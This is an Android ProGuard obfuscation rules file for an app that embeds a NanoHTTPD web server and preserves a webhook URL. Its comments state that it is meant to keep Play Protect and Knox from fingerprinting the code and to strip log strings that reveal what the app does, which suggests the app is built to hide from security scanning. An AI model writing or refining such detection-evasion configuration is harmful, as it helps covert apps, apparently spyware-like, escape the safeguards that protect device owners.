# Optimization Rules for Stealth and Performance

# Keep NanoHTTPD (required for the web server to function)
-keep class fi.iki.elonen.** { *; }

# Allow full obfuscation of our internal logic
# This makes it much harder for Play Protect and Knox to fingerprint the code structure
-keepclassmembers class com.labs.labrats.BuildConfig {
    public static final String WEBHOOK_URL;
}

# Strip debug log messages in release builds
# This removes plain-text strings that reveal app behavior
-assumenosideeffects class android.util.Log {
    public static int v(...);
    public static int d(...);
    public static int i(...);
    public static int w(...);
    public static int e(...);
}

# Keep activity and service names referenced in the manifest (handled by AGP automatically)
# but we want to ensure the logic INSIDE them is mangled.
